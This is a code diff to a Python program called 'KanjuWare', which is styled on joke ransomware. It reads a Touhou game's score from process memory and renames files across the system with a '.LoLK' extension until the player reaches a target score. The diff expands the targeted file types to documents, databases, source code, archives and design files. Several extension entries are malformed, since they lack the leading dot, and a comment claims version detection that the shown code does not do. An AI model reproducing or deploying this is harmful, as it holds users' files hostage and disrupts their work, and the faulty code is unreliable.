@@ -1,6 +1,7 @@
 import ctypes
 import errno
 import os
+import platform
 import sys
 import time
 import threading
@@ -9,25 +10,65 @@ from tkinter import messagebox
 from pymem import Pymem
 
 # ==================== Configuration ====================
-TARGET_SCORE = 5000000
-SCORE_ADDRESS = 0x004E40BC
+TARGET_SCORE = 5000000 # The target score is set to 5 million (5000000) instead of 50 million because the score in memory is actually the displayed score divided by 10. This is a common practice in games to save memory and simplify score handling. So when the player reaches 50 million points, the value stored in memory will be 5 million (5000000). Therefore, we set TARGET_SCORE to 5000000 to correctly detect when the player has reached the required score for unlocking the files.
+SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is stored in the trial version of Touhou Kanjuden. For the full version, the score is stored at 0x004E740C. The program will automatically detect which version is running and read the score from the correct address.
 TARGET_EXTENSION = ".LoLK"
 TEST_DIR = "./test_files"
-ALLOWED_EXTENSIONS = {
-    ".pdf", ".txt", ".md", ".py", ".json", ".doc", ".docx",
-    ".ppt", ".pptx", ".xls", ".xlsx",
-    ".jpg", ".jpeg", ".png",
-    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid",
-    ".mp4", ".mov", ".mkv", ".flv",
-    ".zip", ".rar",
-}
+FILE_EXTENSIONS_NEED_TO_RENAME = {
+    ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
+    ".ppt", ".pptx", ".xls", ".xlsx", "csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", "odp", "ods",
+    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg",
+    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid", "ogg", "opus", "aiff", "wma", "ape",
+    ".mp4", ".mov", ".mkv", ".flv", "avi", "wmv", "mpeg", "flv",
+    ".zip", ".rar", "7z", ".tar", ".gz", ".bz2", "iso",
+    ".py",".cpp", ".h", ".java", ".js", ".html", ".css", ".cs", ".go", ".rb", ".php", "swift", ".kt", ".rs",
+    ".psd", ".ai", ".indd", ".sketch", ".blend", ".fbx", ".obj", ".dwg", ".dxf", ".3ds", ".max",
+
+    ".PDF", ".TXT", ".MD", ".JSON", ".DOC", ".DOCX", ".ODT", ".WPS",
+    ".PPT", ".PPTX", ".XLS", ".XLSX", "CSV", ".TSV", ".SQL", ".DB", ".MDB", ".ACCDB", "ODP", "ODS",
+    ".JPG", ".JPEG", ".PNG", ".BMP", ".GIF", ".SVG",
+    ".MP3", ".M4A", ".AAC", ".FLAC", ".ALAC", ".WAV", ".MID", "OGG", "OPUS", "AIFF", "WMA", "APE",
+    ".MP4", ".MOV", ".MKV", ".FLV", "AVI", ".WMV", ".MPEG", ".FLV",
+    ".ZIP", ".RAR", ".7Z", ".TAR", ".GZ", ".BZ2", "ISO",
+    ".PY",".CPP", ".H", ".JAVA", ".JS", ".HTML", ".CSS", ".CS", ".GO", ".RB", ".PHP", ".SWIFT", ".KT", ".RS",
+    ".PSD", ".AI", ".INDD", ".SKETCH", ".BLEND", ".FBX", ".OBJ", ".DWG", ".DXF", ".3DS", ".MAX"
+} # This set contains the file extensions that the program will target for "encryption" (actually just renaming). The program will scan all files on the system and if a file has one of these extensions and is not already "encrypted" (i.e., does not already have the TARGET_EXTENSION), it will rename the file to add the TARGET_EXTENSION. This simulates the effect of encryption without actually modifying the file contents, which allows for easy recovery by simply renaming the files back to their original names. The list includes common document, image, audio, video, archive, code, and design file formats in both lowercase and uppercase to ensure comprehensive coverage.
 # =======================================================
+
+# ================== High DPI Support ===================
+def setup_high_dpi():
+    if platform.system() == 'Windows':
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(1)
+        except:
+            try:
+                ctypes.windll.user32.SetProcessDPIAware()
+            except:
+                pass
+# =====================================================
 
 class KanjuWareApp:
     def __init__(self, root):
+        def get_scale_factor():
+            if platform.system() == 'Windows':
+                try:
+                    return ctypes.windll.user32.GetDpiForSystem() / 96.0
+                except:
+                    hdc = ctypes.windll.user32.GetDC(0)
+                    dpi = ctypes.windll.gdi32.GetDeviceCaps(hdc, 88)
+                    ctypes.windll.user32.ReleaseDC(0, hdc)
+                    return dpi / 96.0
+            # Linux and macOS typically handle DPI scaling automatically, but we can attempt to read GDK_SCALE for Linux
+            try:
+                # Some Linux environments use GDK_SCALE for scaling factor, default to 1.0 if not set
+                return float(os.environ.get('GDK_SCALE', 1.0))
+            except:
+                return 1.0
+        scale = get_scale_factor()
         self.root = root
-        self.root.title("KanjuWare v1.1 - Pure Mutation")
-        self.root.geometry("500x400")
+        self.root.title("KanjuWare v1.12 - Pure Mutation")
+        BASE_W, BASE_H = 500, 400
+        self.root.geometry(f"{int(BASE_W * scale)}x{int(BASE_H * scale)}")
         self.root.resizable(False, False)
         
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
@@ -131,7 +172,7 @@ class KanjuWareApp:
                     continue
                 for file in files:
                     lower_ext = os.path.splitext(file)[1].lower()
-                    if lower_ext in ALLOWED_EXTENSIONS and not file.endswith(TARGET_EXTENSION):
+                    if lower_ext in FILE_EXTENSIONS_NEED_TO_RENAME and not file.endswith(TARGET_EXTENSION):
                         old_path = os.path.join(root_path, file)
                         new_path = old_path + TARGET_EXTENSION
                         if self._safe_rename(old_path, new_path):
@@ -250,6 +291,7 @@ if __name__ == "__main__":
                 0x10,
             )
 
+    setup_high_dpi()
     root = tk.Tk()
     root.withdraw()
     start_confirmation = messagebox.askyesno(
